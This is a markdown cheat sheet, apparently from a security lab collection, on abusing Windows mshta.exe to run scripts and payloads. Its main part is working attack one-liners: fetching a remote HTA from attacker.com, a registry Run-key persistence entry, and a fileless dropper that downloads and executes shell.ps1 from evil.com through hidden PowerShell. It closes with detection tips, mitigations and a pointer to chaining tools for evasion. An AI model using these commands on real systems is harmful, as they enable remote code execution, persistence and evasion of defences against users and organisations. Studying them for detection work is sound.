# 🌐 Mshta - Living Off the Land

**Mshta.exe** is a built-in Windows binary that runs Microsoft HTML Applications (HTA files). While designed for legitimate administrative scripting, it’s often abused to **execute JavaScript or VBScript**, launch payloads, and establish fileless persistence.

> ⚠️ All examples are for educational use in isolated lab environments only.

---

## 🛠️ What It Does
- Executes remote or local `.hta` (HTML Application) files
- Runs JavaScript or VBScript natively in Windows
- Bypasses many traditional AV signatures
- Facilitates **fileless execution** of malware

---

## 💣 Common LotL Mshta Techniques

### 1. Run Remote HTA File
```cmd
mshta http://attacker.com/payload.hta
```
✅ Executes malicious HTA directly from the internet

---

### 2. Execute Inline JavaScript
```cmd
mshta "javascript:eval('wscript.shell.run(\"cmd.exe /c calc.exe\")')"
```
✅ Inline JavaScript lets you launch commands without a file

---

### 3. Launch Script via Local HTA File
```cmd
mshta C:\Users\Public\script.hta
```
✅ Local HTAs can be dropped during initial access

---

### 4. Embed HTA in Registry and Execute
```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updatetask /d "mshta vbscript:CreateObject("Wscript.Shell").Run("http://evil.com/payload.hta")"
```
✅ Achieves persistence via registry autorun key

---

### 5. Use Mshta for Fileless Dropper
```cmd
mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Run('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/shell.ps1\')'); close();"
```
✅ Combines JavaScript + PowerShell for fully in-memory attack

---

## 🕵️‍♂️ Detection Tips
| Indicator | Detection Method |
|-----------|------------------|
| `mshta` launching from browser or Office | Flag suspicious parent-child processes |
| HTA from remote URL | Detect outbound `mshta` + HTTP GET to unknown domains |
| Inline JavaScript in command-line | Monitor for `javascript:` in `mshta.exe` args |
| Autoruns with `mshta` | Watch registry keys for startup payloads |

---

## 🔐 Mitigation Strategies
- Block or restrict `mshta.exe` execution using AppLocker or WDAC
- Monitor network traffic for HTA downloads from suspicious hosts
- Detect registry-based persistence involving `mshta`
- Depricate or uninstall HTA-based components on systems that don’t need them

---

> 🔗 Combine `mshta` with `certutil` or `powershell` in multi-stage payloads for deeper evasion (see Labs section)
